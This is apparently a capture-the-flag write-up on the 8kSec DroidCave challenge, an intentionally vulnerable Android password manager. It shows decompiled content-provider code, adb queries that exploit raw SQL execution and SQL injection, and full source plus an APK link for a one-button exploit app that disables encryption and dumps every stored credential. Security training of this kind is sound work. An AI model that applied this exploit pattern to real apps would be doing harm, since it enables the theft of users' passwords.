---
title: DroidCave - 8kSec
date: 2025-10-4 00:00:00 +/-TTTT
categories: [8kSec]
tags: [8kSec, writeup, mobile penetration testing, android]     # TAG names should always be lowercase
---



<br />

**Description**

Tired of worrying about your password security? **DroidCave** offers a robust and intuitive password management solution for Android users. Store all your credentials in one secure location with military-grade encryption. Our clean, material design interface makes managing passwords effortless — create categories, generate strong passwords, and access your favorite sites with just one tap.

DroidCave encrypts all sensitive data using industry-standard methods, ensuring your passwords remain protected at all times. Never worry about remembering complex passwords again!

<br />

**Objective**

Create a malicious application that demonstrates your expertise in SQL injection and IPC mechanism exploitation to steal passwords stored in DroidCave, even when the user has enabled password encryption in the settings. Your goal is to develop an Android application with an innocent appearance that can, with just one click of a seemingly normal button, extract both plaintext passwords and the decrypted form of encrypted passwords from the DroidCave database.

Successfully completing this challenge demonstrates how seemingly secure password managers can be compromised through common vulnerabilities, potentially leading to widespread credential theft across multiple services.

<br />

**Restrictions**

Your POC Android exploit APK must work on Android versions up to Android 15 and should not require any additional permissions that the user must explicitly grant.

<br />

**Explore the application**

The application is a password manager that allows users to store their passwords. To access the stored passwords, you must first enter the master password.

![](/assets/img/8ksec/DroidCave/1.png)

<br />

After unlocking the app, you can add a new password entry by providing details such as the name, username, password, URL, and notes, then saving the entry.

<br />

![](/assets/img/8ksec/DroidCave/3.png)

<br />

From the main page, the app displays a list of all the saved password entries.

<br />

![](/assets/img/8ksec/DroidCave/4.png)

<br />

All passwords are stored in plaintext within a SQLite database.

![](/assets/img/8ksec/DroidCave/6.png)

<br />

However, the app includes a feature to encrypt stored passwords, which can be enabled through the app’s settings.

<br />

![](/assets/img/8ksec/DroidCave/5.png)

<br />

Once encryption is enabled, the passwords are stored in encrypted form within the database.

![](/assets/img/8ksec/DroidCave/7.png)

<br />

**Analyzing the application using JADX**

From: AndroidManifest.xml

```xml
<provider
    android:name="com.eightksec.droidcave.provider.PasswordContentProvider"
    android:exported="true"
    android:authorities="com.eightksec.droidcave.provider"
    android:grantUriPermissions="true"/>
```

- `android:exported="true"` → other apps **can access** this provider.
- `android:authorities="com.eightksec.droidcave.provider"` → this is the **URI authority**.
- `android:grantUriPermissions="true"` → temporary URI access can be granted (e.g., via `Intent` flags).

because this provider has **no permission protection**, any app can query it, insert, update, or delete.



<br />

From: com.eightksec.droidcave.provider.PasswordContentProvider

```java
public final class PasswordContentProvider extends ContentProvider {
    public static final String AUTHORITY = "com.eightksec.droidcave.provider";
    private static final int CODE_DISABLE_ENCRYPTION = 7;
    private static final int CODE_ENABLE_ENCRYPTION = 8;
    private static final int CODE_EXECUTE_SQL = 5;
    private static final int CODE_PASSWORDS_DIR = 1;
    private static final int CODE_PASSWORD_ITEM = 2;
    private static final int CODE_PASSWORD_SEARCH = 3;
    private static final int CODE_PASSWORD_TYPE = 4;
    private static final int CODE_SETTINGS = 6;
    private static final int CODE_SET_PASSWORD_PLAINTEXT = 9;
    private static final UriMatcher MATCHER;
    private static final String PATH_DISABLE_ENCRYPTION = "disable_encryption";
    private static final String PATH_ENABLE_ENCRYPTION = "enable_encryption";
    private static final String PATH_EXECUTE_SQL = "execute_sql";
    private static final String PATH_PASSWORDS = "passwords";
    private static final String PATH_PASSWORD_SEARCH = "password_search";
    private static final String PATH_PASSWORD_TYPE = "password_type";
    private static final String PATH_SETTINGS = "settings";
    private static final String PATH_SET_PASSWORD_PLAINTEXT = "set_password_plaintext";
    private static final String TABLE_PASSWORDS = "passwords";
    private SupportSQLiteDatabase database;
    private SharedPreferences sharedPreferences;

    static {
        UriMatcher uriMatcher = new UriMatcher(-1);
        MATCHER = uriMatcher;
        uriMatcher.addURI(AUTHORITY, "passwords", 1);
        uriMatcher.addURI(AUTHORITY, "passwords/#", 2);
        uriMatcher.addURI(AUTHORITY, "password_search/*", 3);
        uriMatcher.addURI(AUTHORITY, "password_type/*", 4);
        uriMatcher.addURI(AUTHORITY, "execute_sql/*", 5);
        uriMatcher.addURI(AUTHORITY, "settings/*", 6);
        uriMatcher.addURI(AUTHORITY, PATH_DISABLE_ENCRYPTION, 7);
        uriMatcher.addURI(AUTHORITY, PATH_ENABLE_ENCRYPTION, 8);
        uriMatcher.addURI(AUTHORITY, "set_password_plaintext/*/*", 9);
    }


```

<br />

| Code | URI Pattern                    | Example URI                                              | Meaning / Likely Function                       |
| ---- | ------------------------------ | -------------------------------------------------------- | ----------------------------------------------- |
| `1`  | `"passwords"`                  | `content://com.eightksec.droidcave.provider/passwords`   | List all password entries (main table).         |
| `2`  | `"passwords/#"`                | `content://com.eightksec.droidcave.provider/passwords/5` | A specific password entry by ID.                |
| `3`  | `"password_search/*"`          | `content://.../password_search/facebook`                 | Search passwords by keyword (e.g., “facebook”). |
| `4`  | `"password_type/*"`            | `content://.../password_type/LOGIN`                      | Filter passwords by type (LOGIN, CARD, etc.).   |
| `5`  | `"execute_sql/*"`              | `content://.../execute_sql/SELECT+*+FROM+passwords`      | runs raw SQL Queries                            |
| `6`  | `"settings/*"`                 | `content://.../settings/get_encryption_enabled`          | Read or modify settings entries.                |
| `7`  | `PATH_DISABLE_ENCRYPTION`      | `content://.../disable_encryption`                       | A custom URI to **turn off encryption**.        |
| `8`  | `PATH_ENABLE_ENCRYPTION`       | `content://.../enable_encryption`                        | A custom URI to **turn on encryption**.         |
| `9`  | `"set_password_plaintext/*/*"` | `content://.../set_password_plaintext/ID/PASSWORD`       | Set or update a password in plaintext.          |

<br />

**Case 1:** list all saved passwords

From: com.eightksec.droidcave.provider.PasswordContentProvider

```java
    public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
        MatrixCursor matrixCursor;
        SupportSQLiteDatabase supportSQLiteDatabase;
        SupportSQLiteDatabase supportSQLiteDatabase2;
        Context applicationContext;
        SharedPreferences sharedPreferences;
        SharedPreferences.Editor edit;
        SharedPreferences.Editor putBoolean;
        MatrixCursor matrixCursor2;
        List<String> pathSegments;
        SupportSQLiteDatabase supportSQLiteDatabase3;
        MatrixCursor matrixCursor3;
        Context context;
        SupportSQLiteDatabase supportSQLiteDatabase4;
        Context applicationContext2;
        SharedPreferences sharedPreferences2;
        SharedPreferences.Editor edit2;
        SharedPreferences.Editor putBoolean2;
        MatrixCursor matrixCursor4;
        SharedPreferences sharedPreferences3;
        SharedPreferences sharedPreferences4;
        Intrinsics.checkNotNullParameter(uri, "uri");
        if (this.database == null) {
            return null;
        }
        switch (MATCHER.match(uri)) {
            case 1:
                SupportSQLiteDatabase supportSQLiteDatabase5 = null;
                SupportSQLiteQueryBuilder builder = SupportSQLiteQueryBuilder.INSTANCE.builder("passwords");
                builder.columns(projection);
                if (selection != null) {
                    builder.selection(selection, selectionArgs);
                }
                builder.orderBy(sortOrder == null ? "name ASC" : sortOrder);
                SupportSQLiteDatabase supportSQLiteDatabase6 = this.database;
                if (supportSQLiteDatabase6 == null) {
                    Intrinsics.throwUninitializedPropertyAccessException("database");
                } else {
                    supportSQLiteDatabase5 = supportSQLiteDatabase6;
                }
                return supportSQLiteDatabase5.query(builder.create());

```

<br />

adb example:

```
adb shell content query --uri content://com.eightksec.droidcave.provider/passwords

Row: 0 id=1, name=Facebook, username=karim, password=BLOB, url=https://fb.com, notes=NULL, type=LOGIN, isFavorite=1, createdAt=1761498543026, updatedAt=1761498726779, isEncrypted=0
Row: 1 id=2, name=Github, username=admin, password=BLOB, url=https://github.com, notes=NULL, type=LOGIN, isFavorite=0, createdAt=1761498595528, updatedAt=1761498726787, isEncrypted=0
```

<br />

**Case 2:** Query a specific password entry by its ID

```java
    case 2:
        SupportSQLiteDatabase supportSQLiteDatabase7 = null;
        String lastPathSegment = uri.getLastPathSegment();
        SupportSQLiteQueryBuilder builder2 = SupportSQLiteQueryBuilder.INSTANCE.builder("passwords");
        builder2.columns(projection);
        builder2.selection("id = ?", new String[]{lastPathSegment});
        SupportSQLiteDatabase supportSQLiteDatabase8 = this.database;
        if (supportSQLiteDatabase8 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("database");
        } else {
            supportSQLiteDatabase7 = supportSQLiteDatabase8;
        }
        return supportSQLiteDatabase7.query(builder2.create());

```

<br />

adb example:

```
adb shell content query --uri content://com.eightksec.droidcave.provider/passwords/1

Row: 0 id=1, name=Facebook, username=karim, password=BLOB, url=https://fb.com, notes=NULL, type=LOGIN, isFavorite=1, createdAt=1761498543026, updatedAt=1761498726779, isEncrypted=0
```

<br />

```
adb shell content query --uri content://com.eightksec.droidcave.provider/passwords/2

Row: 0 id=2, name=Github, username=admin, password=BLOB, url=https://github.com, notes=NULL, type=LOGIN, isFavorite=0, createdAt=1761498595528, updatedAt=1761498726787, isEncrypted=0
```

<br />

**Case 3:** Search for password entries containing a specific keyword in the **name**, **username**, or **notes** fields

```
    case 3:
        SupportSQLiteDatabase supportSQLiteDatabase9 = null;
        String lastPathSegment2 = uri.getLastPathSegment();
        String str = lastPathSegment2 == null ? "" : lastPathSegment2;
        String str2 = "SELECT * FROM passwords WHERE name LIKE '%" + str + "%' OR username LIKE '%" + str + "%' OR notes LIKE '%" + str + "%'";
        SupportSQLiteDatabase supportSQLiteDatabase10 = this.database;
        if (supportSQLiteDatabase10 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("database");
        } else {
            supportSQLiteDatabase9 = supportSQLiteDatabase10;
        }
        return supportSQLiteDatabase9.query(str2);

```

<br />

adb example:

```
adb shell content query --uri content://com.eightksec.droidcave.provider/password_search/face

Row: 0 id=1, name=Facebook, username=karim, password=BLOB, url=https://fb.com, notes=NULL, type=LOGIN, isFavorite=1, createdAt=1761498543026, updatedAt=1761498726779, isEncrypted=0
```

<br />

**Case 4:** Query passwords filtered by their type

```java
    case 4:
        SupportSQLiteDatabase supportSQLiteDatabase11 = null;
        String lastPathSegment3 = uri.getLastPathSegment();
        String str3 = "SELECT * FROM passwords WHERE type = '" + (lastPathSegment3 == null ? "" : lastPathSegment3) + "'";
        SupportSQLiteDatabase supportSQLiteDatabase12 = this.database;
        if (supportSQLiteDatabase12 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("database");
        } else {
            supportSQLiteDatabase11 = supportSQLiteDatabase12;
        }
        return supportSQLiteDatabase11.query(str3);

```

<br />

adb example:

```
adb shell content query --uri content://com.eightksec.droidcave.provider/password_type/LOGIN

Row: 0 id=1, name=Facebook, username=karim, password=BLOB, url=https://fb.com, notes=NULL, type=LOGIN, isFavorite=1, createdAt=1761498543026, updatedAt=1761498726779, isEncrypted=0
Row: 1 id=2, name=Github, username=admin, password=BLOB, url=https://github.com, notes=NULL, type=LOGIN, isFavorite=0, createdAt=1761498595528, updatedAt=1761498726787, isEncrypted=0
```

<br />

**Case 5:** `execute_sql` allows you to run a custom SQL query

```java
    case 5:
        SupportSQLiteDatabase supportSQLiteDatabase13 = null;
        String lastPathSegment4 = uri.getLastPathSegment();
        if (lastPathSegment4 == null) {
            lastPathSegment4 = "";
        }
        try {
            SupportSQLiteDatabase supportSQLiteDatabase14 = this.database;
            if (supportSQLiteDatabase14 == null) {
                Intrinsics.throwUninitializedPropertyAccessException("database");
            } else {
                supportSQLiteDatabase13 = supportSQLiteDatabase14;
            }
            return supportSQLiteDatabase13.query(lastPathSegment4);
        } catch (Exception e) {
            Log.e("PasswordProvider", "SQL Error: " + e.getMessage(), e);
            MatrixCursor matrixCursor5 = new MatrixCursor(new String[]{"error"});
            matrixCursor5.addRow(new String[]{"SQL Error: " + e.getMessage()});
            return matrixCursor5;
        }

```

<br />

adb example:

```
adb shell content query --uri content://com.eightksec.droidcave.provider/execute_sql/select * from passwords;
```

<br />

```
adb shell content query --uri content://com.eightksec.droidcave.provider/execute_sql/select%20*%20from%20passwords;

Row: 0 id=1, name=Facebook, username=karim, password=BLOB, url=https://fb.com, notes=NULL, type=LOGIN, isFavorite=1, createdAt=1761498543026, updatedAt=1761498726779, isEncrypted=0
Row: 1 id=2, name=Github, username=admin, password=BLOB, url=https://github.com, notes=NULL, type=LOGIN, isFavorite=0, createdAt=1761498595528, updatedAt=1761498726787, isEncrypted=0
```

<br />

**Case 6:** allows the content provider to manage the app’s **encryption setting**

```java
    case 6:
        String lastPathSegment5 = uri.getLastPathSegment();
        if (lastPathSegment5 == null) {
            lastPathSegment5 = "";
        }
        if (StringsKt.startsWith$default(lastPathSegment5, "get_", false, 2, (Object) null)) {
            String substring = lastPathSegment5.substring(4);
            Intrinsics.checkNotNullExpressionValue(substring, "substring(...)");
            MatrixCursor matrixCursor6 = new MatrixCursor(new String[]{"key", "value"});
            if (Intrinsics.areEqual(substring, SettingsViewModel.KEY_ENCRYPTION_ENABLED)) {
                SharedPreferences sharedPreferences5 = this.sharedPreferences;
                if (sharedPreferences5 == null) {
                    Intrinsics.throwUninitializedPropertyAccessException("sharedPreferences");
                    sharedPreferences4 = null;
                } else {
                    sharedPreferences4 = sharedPreferences5;
                }
                matrixCursor6.addRow(new String[]{SettingsViewModel.KEY_ENCRYPTION_ENABLED, String.valueOf(sharedPreferences4.getBoolean(SettingsViewModel.KEY_ENCRYPTION_ENABLED, false))});
            } else if (Intrinsics.areEqual(substring, "all")) {
                SharedPreferences sharedPreferences6 = this.sharedPreferences;
                if (sharedPreferences6 == null) {
                    Intrinsics.throwUninitializedPropertyAccessException("sharedPreferences");
                    sharedPreferences3 = null;
                } else {
                    sharedPreferences3 = sharedPreferences6;
                }
                matrixCursor6.addRow(new String[]{SettingsViewModel.KEY_ENCRYPTION_ENABLED, String.valueOf(sharedPreferences3.getBoolean(SettingsViewModel.KEY_ENCRYPTION_ENABLED, false))});
            }
            matrixCursor4 = matrixCursor6;
        } else {
            matrixCursor4 = null;
            SharedPreferences sharedPreferences7 = null;
            if (StringsKt.startsWith$default(lastPathSegment5, "set_", false, 2, (Object) null)) {
                String substring2 = lastPathSegment5.substring(4);
                Intrinsics.checkNotNullExpressionValue(substring2, "substring(...)");
                List split$default = StringsKt.split$default((CharSequence) substring2, new String[]{"="}, false, 0, 6, (Object) null);
                if (split$default.size() == 2) {
                    String str4 = (String) split$default.get(0);
                    String str5 = (String) split$default.get(1);
                    if (Intrinsics.areEqual(str4, SettingsViewModel.KEY_ENCRYPTION_ENABLED)) {
                        boolean equals = StringsKt.equals(str5, "true", true);
                        SharedPreferences sharedPreferences8 = this.sharedPreferences;
                        if (sharedPreferences8 == null) {
                            Intrinsics.throwUninitializedPropertyAccessException("sharedPreferences");
                        } else {
                            sharedPreferences7 = sharedPreferences8;
                        }
                        sharedPreferences7.edit().putBoolean(SettingsViewModel.KEY_ENCRYPTION_ENABLED, equals).apply();
                        if (equals) {
                            Uri parse = Uri.parse("content://com.eightksec.droidcave.provider/enable_encryption");
                            Intrinsics.checkNotNullExpressionValue(parse, "parse(...)");
                            return query(parse, null, null, null, null);
                        }
                        Uri parse2 = Uri.parse("content://com.eightksec.droidcave.provider/disable_encryption");
                        Intrinsics.checkNotNullExpressionValue(parse2, "parse(...)");
                        return query(parse2, null, null, null, null);
                    }
                    matrixCursor4 = new MatrixCursor(new String[]{"error"});
                    matrixCursor4.addRow(new String[]{"Unknown setting: " + str4});
                } else {
                    matrixCursor4 = new MatrixCursor(new String[]{"error"});
                    matrixCursor4.addRow(new String[]{"Invalid format. Use set_key=value"});
                }
            }
        }
        return matrixCursor4;
```

<br />

| URI                                                          | Action                                                 |
| ------------------------------------------------------------ | ------------------------------------------------------ |
| `content://com.eightksec.droidcave.provider/settings/get_encryption_enabled` | Reads whether encryption is enabled                    |
| `content://com.eightksec.droidcave.provider/settings/set_encryption_enabled=true` | Enables encryption                                     |
| `content://com.eightksec.droidcave.provider/settings/set_encryption_enabled=false` | Disables encryption                                    |
| `content://com.eightksec.droidcave.provider/settings/get_all` | Lists all settings (currently just encryption_enabled) |

<br />

adb example:

```
adb shell content query --uri content://com.eightksec.droidcave.provider/settings/get_encryption_enabled
Row: 0 key=encryption_enabled, value=false
```

<br />

```
adb shell content query --uri content://com.eightksec.droidcave.provider/settings/set_encryption_enabled=true

Row: 0 result=Encryption enabled and 2 passwords encrypted. Failed: 0
```

<br />

```
adb shell content query --uri content://com.eightksec.droidcave.provider/settings/set_encryption_enabled=false

Row: 0 result=Encryption disabled and 2 passwords successfully decrypted.
```

<br />

**Case 7:** Decrypt all encrypted passwords

```java
case 7:
        try {
            SharedPreferences sharedPreferences9 = this.sharedPreferences;
            if (sharedPreferences9 == null) {
                Intrinsics.throwUninitializedPropertyAccessException("sharedPreferences");
                sharedPreferences9 = null;
            }
            sharedPreferences9.edit().putBoolean(SettingsViewModel.KEY_ENCRYPTION_ENABLED, false).commit();
            Context context2 = getContext();
            if (context2 != null && (applicationContext = context2.getApplicationContext()) != null && (sharedPreferences = applicationContext.getSharedPreferences("settings_prefs", 0)) != null && (edit = sharedPreferences.edit()) != null && (putBoolean = edit.putBoolean(SettingsViewModel.KEY_ENCRYPTION_ENABLED, false)) != null) {
                Boolean.valueOf(putBoolean.commit());
            }
        } catch (Exception e2) {
            MatrixCursor matrixCursor7 = new MatrixCursor(new String[]{"error"});
            matrixCursor7.addRow(new String[]{"Error disabling encryption: " + e2.getMessage()});
            matrixCursor = matrixCursor7;
        }
        try {
            EncryptionService encryptionService = new EncryptionService();
            SupportSQLiteDatabase supportSQLiteDatabase15 = this.database;
            if (supportSQLiteDatabase15 == null) {
                Intrinsics.throwUninitializedPropertyAccessException("database");
                supportSQLiteDatabase15 = null;
            }
            Cursor query = supportSQLiteDatabase15.query("SELECT id, password FROM passwords WHERE isEncrypted = 1");
            ArrayList arrayList = new ArrayList();
            ArrayList arrayList2 = new ArrayList();
            while (query.moveToNext()) {
                long j = query.getLong(query.getColumnIndexOrThrow("id"));
                byte[] blob = query.getBlob(query.getColumnIndexOrThrow("password"));
                try {
                    Intrinsics.checkNotNull(blob);
                    byte[] bytes = encryptionService.decrypt(blob).getBytes(Charsets.UTF_8);
                    Intrinsics.checkNotNullExpressionValue(bytes, "getBytes(...)");
                    ContentValues contentValues = new ContentValues();
                    contentValues.put("password", bytes);
                    contentValues.put("isEncrypted", (Integer) 0);
                    SupportSQLiteDatabase supportSQLiteDatabase16 = this.database;
                    if (supportSQLiteDatabase16 == null) {
                        Intrinsics.throwUninitializedPropertyAccessException("database");
                        supportSQLiteDatabase2 = null;
                    } else {
                        supportSQLiteDatabase2 = supportSQLiteDatabase16;
                    }
                    if (supportSQLiteDatabase2.update("passwords", 5, contentValues, "id = ?", new String[]{String.valueOf(j)}) > 0) {
                        arrayList.add(String.valueOf(j));
                    } else {
                        arrayList2.add(String.valueOf(j));
                    }
                } catch (Exception e3) {
                    Log.e("PasswordProvider", "Error decrypting password ID: " + j, e3);
                    try {
                        byte[] bytes2 = "password123".getBytes(Charsets.UTF_8);
                        Intrinsics.checkNotNullExpressionValue(bytes2, "getBytes(...)");
                        ContentValues contentValues2 = new ContentValues();
                        contentValues2.put("password", bytes2);
                        contentValues2.put("isEncrypted", (Integer) 0);
                        SupportSQLiteDatabase supportSQLiteDatabase17 = this.database;
                        if (supportSQLiteDatabase17 == null) {
                            Intrinsics.throwUninitializedPropertyAccessException("database");
                            supportSQLiteDatabase = null;
                        } else {
                            supportSQLiteDatabase = supportSQLiteDatabase17;
                        }
                        supportSQLiteDatabase.update("passwords", 5, contentValues2, "id = ?", new String[]{String.valueOf(j)});
                        arrayList2.add(j + " (set to fallback)");
                    } catch (Exception e4) {
                        Log.e("PasswordProvider", "Error setting fallback password for ID: " + j, e4);
                        arrayList2.add(j + " (complete failure)");
                    }
                }
            }
            query.close();
            matrixCursor = new MatrixCursor(new String[]{"result"});
            if (arrayList2.isEmpty()) {
                matrixCursor.addRow(new String[]{"Encryption disabled and " + arrayList.size() + " passwords successfully decrypted."});
            } else {
                matrixCursor.addRow(new String[]{"Encryption disabled. " + arrayList.size() + " passwords decrypted successfully. " + arrayList2.size() + " failed and were set to fallback value."});
            }
            return matrixCursor;
        } catch (Exception e5) {
            Log.e("PasswordProvider", "Error creating EncryptionService", e5);
            throw e5;
        }
```

<br />

| Step | Action                                       | Result                                 |
| ---- | -------------------------------------------- | -------------------------------------- |
| 1    | Disable encryption flag in SharedPreferences | App won’t encrypt new passwords        |
| 2    | Query all encrypted passwords                | Select `isEncrypted = 1`               |
| 3    | Decrypt each password                        | Replace encrypted BLOBs with plaintext |
| 4    | If decryption fails                          | Replace with `"password123"` fallback  |
| 5    | Return summary                               | Show how many were decrypted / failed  |

<br />

adb example:

```
adb shell content query --uri content://com.eightksec.droidcave.provider/disable_encryption
Row: 0 result=Encryption disabled and 2 passwords successfully decrypted.

adb shell content query --uri content://com.eightksec.droidcave.provider/settings/get_encryption_enabled
Row: 0 key=encryption_enabled, value=false
```

<br />

**Case 8:** Encrypt all decrypted passwords

```java
case 8:
        try {
            SharedPreferences sharedPreferences10 = this.sharedPreferences;
            if (sharedPreferences10 == null) {
                Intrinsics.throwUninitializedPropertyAccessException("sharedPreferences");
                sharedPreferences10 = null;
            }
            sharedPreferences10.edit().putBoolean(SettingsViewModel.KEY_ENCRYPTION_ENABLED, true).commit();
            Context context3 = getContext();
            if (context3 != null && (applicationContext2 = context3.getApplicationContext()) != null && (sharedPreferences2 = applicationContext2.getSharedPreferences("settings_prefs", 0)) != null && (edit2 = sharedPreferences2.edit()) != null && (putBoolean2 = edit2.putBoolean(SettingsViewModel.KEY_ENCRYPTION_ENABLED, true)) != null) {
                Boolean.valueOf(putBoolean2.commit());
            }
            context = getContext();
        } catch (Exception e6) {
            Log.e("PasswordProvider", "Error enabling encryption", e6);
            MatrixCursor matrixCursor8 = new MatrixCursor(new String[]{"error"});
            matrixCursor8.addRow(new String[]{"Error enabling encryption: " + e6.getMessage()});
            matrixCursor3 = matrixCursor8;
        }
        if ((context != null ? context.getApplicationContext() : null) == null) {
            throw new IllegalStateException("Context is null");
        }
        try {
            EncryptionService encryptionService2 = new EncryptionService();
            SupportSQLiteDatabase supportSQLiteDatabase18 = this.database;
            if (supportSQLiteDatabase18 == null) {
                Intrinsics.throwUninitializedPropertyAccessException("database");
                supportSQLiteDatabase18 = null;
            }
            Cursor query2 = supportSQLiteDatabase18.query("SELECT id, password FROM passwords WHERE isEncrypted = 0");
            ArrayList arrayList3 = new ArrayList();
            ArrayList arrayList4 = new ArrayList();
            while (query2.moveToNext()) {
                long j2 = query2.getLong(query2.getColumnIndexOrThrow("id"));
                byte[] blob2 = query2.getBlob(query2.getColumnIndexOrThrow("password"));
                try {
                    Intrinsics.checkNotNull(blob2);
                    byte[] encrypt = encryptionService2.encrypt(new String(blob2, Charsets.UTF_8));
                    ContentValues contentValues3 = new ContentValues();
                    contentValues3.put("password", encrypt);
                    contentValues3.put("isEncrypted", (Integer) 1);
                    SupportSQLiteDatabase supportSQLiteDatabase19 = this.database;
                    if (supportSQLiteDatabase19 == null) {
                        Intrinsics.throwUninitializedPropertyAccessException("database");
                        supportSQLiteDatabase4 = null;
                    } else {
                        supportSQLiteDatabase4 = supportSQLiteDatabase19;
                    }
                    if (supportSQLiteDatabase4.update("passwords", 5, contentValues3, "id = ?", new String[]{String.valueOf(j2)}) > 0) {
                        arrayList3.add(String.valueOf(j2));
                    } else {
                        arrayList4.add(String.valueOf(j2));
                    }
                } catch (Exception e7) {
                    Log.e("PasswordProvider", "Error encrypting password ID: " + j2, e7);
                    arrayList4.add(String.valueOf(j2));
                }
            }
            query2.close();
            matrixCursor3 = new MatrixCursor(new String[]{"result"});
            matrixCursor3.addRow(new String[]{"Encryption enabled and " + arrayList3.size() + " passwords encrypted. Failed: " + arrayList4.size()});
            return matrixCursor3;
        } catch (Exception e8) {
            Log.e("PasswordProvider", "Error creating EncryptionService", e8);
            throw e8;
        }

```

<br />

| Step | Action                                   | Result                                                    |
| ---- | ---------------------------------------- | --------------------------------------------------------- |
| 1    | Enable encryption in `SharedPreferences` | The app’s encryption flag is set to `true`                |
| 2    | Query all unencrypted passwords          | Select `isEncrypted = 0`                                  |
| 3    | Encrypt each password                    | Store encrypted bytes in database                         |
| 4    | Handle failures                          | Log and count failed encryptions                          |
| 5    | Return summary                           | “Encryption enabled and X passwords encrypted. Failed: Y” |

<br />

adb example:

```
adb shell content query --uri content://com.eightksec.droidcave.provider/enable_encryption
Row: 0 result=Encryption enabled and 2 passwords encrypted. Failed: 0


adb shell content query --uri content://com.eightksec.droidcave.provider/settings/get_encryption_enabled
Row: 0 key=encryption_enabled, value=true
```

<br />

**Android app PoC**

AndroidManifest.xml

```xml
<queries>
    <package android:name="com.eightksec.droidcave" />
</queries>
```

<br />

MainActivity.java

```java
package com.example.droidcave;


import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

        TextView textView;

        @Override
        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            EdgeToEdge.enable(this);
            setContentView(R.layout.activity_main);

            Button button = findViewById(R.id.button);
            textView = findViewById(R.id.textView);

            button.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    DisableEncryptionAndLoadPasswords();
                }
            });
        }

        private void DisableEncryptionAndLoadPasswords() {
            getContentResolver().query(Uri.parse("content://com.eightksec.droidcave.provider/disable_encryption"), null, null, null, null);
            StringBuilder result = new StringBuilder();
          //  Uri uri = Uri.parse("content://com.eightksec.droidcave.provider/passwords");
          	  Uri uri = Uri.parse("content://com.eightksec.droidcave.provider/execute_sql/SELECT%20*%20FROM%20passwords"); // SELECT * FROM passwords;

            Cursor cursor = null;

            try {
                cursor = getContentResolver().query(uri, null, null, null, null);

                if (cursor != null && cursor.moveToFirst()) {
                    do {
                        result.append("──────────────\n");
                        for (int i = 0; i < cursor.getColumnCount(); i++) {
                            String column = cursor.getColumnName(i);
                            int type = cursor.getType(i);
                            String value;

                            if (type == Cursor.FIELD_TYPE_STRING) {
                                value = cursor.getString(i);
                            } else if (type == Cursor.FIELD_TYPE_INTEGER) {
                                value = String.valueOf(cursor.getInt(i));
                            } else if (type == Cursor.FIELD_TYPE_BLOB) {
                                value = "[BLOB] " + new String(cursor.getBlob(i));
                            } else {
                                value = "[UNKNOWN]";
                            }

                            result.append(column).append(" = ").append(value).append("\n");
                        }
                        result.append("\n");

                    } while (cursor.moveToNext());
                } else {
                    result.append("No data found or query failed.");
                }

                textView.setText(result.toString());

            } catch (Exception e) {
                Log.e("DroidCave", "Query failed", e);
                textView.setText("Error: " + e.getMessage());
            } finally {
                if (cursor != null) cursor.close();
            }

    }
}
```

<br />

layout/activity_main.xml

```xml
<?xml version="1.0" encoding="utf-8"?>
<androidx.constraintlayout.widget.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    xmlns:tools="http://schemas.android.com/tools"
    android:id="@+id/main"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:padding="16dp"
    tools:context=".MainActivity">

    <Button
        android:id="@+id/button"
        android:layout_width="251dp"
        android:layout_height="62dp"
        android:text="Load Passwords"
        app:layout_constraintBottom_toBottomOf="parent"
        app:layout_constraintEnd_toEndOf="parent"
        app:layout_constraintStart_toStartOf="parent"
        app:layout_constraintTop_toTopOf="parent"
        app:layout_constraintVertical_bias="0.91" />


    <ScrollView
        android:layout_width="366dp"
        android:layout_height="513dp"
        app:layout_constraintBottom_toTopOf="@+id/button"
        app:layout_constraintTop_toTopOf="parent"
        tools:layout_editor_absoluteX="0dp">

        <TextView
            android:id="@+id/textView"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:padding="8dp"
            android:textColor="#222222"
            android:textSize="16sp" />
    </ScrollView>
</androidx.constraintlayout.widget.ConstraintLayout>
```

<br />

![](/assets/img/8ksec/DroidCave/8.png)

<br />

Query only the username and the password: SELECT username, password FROM passwords

```java
    Uri uri = Uri.parse("content://com.eightksec.droidcave.provider/execute_sql/SELECT%20username%2Cpassword%20FROM%20passwords");

```

<br />

![](/assets/img/8ksec/DroidCave/9.png)

<br />

Download the PoC exploit app from [here](https://github.com/karim-moftah/karim-moftah.github.io/blob/main/assets/img/8ksec/DroidCave/DroidCave-Exploit.apk)
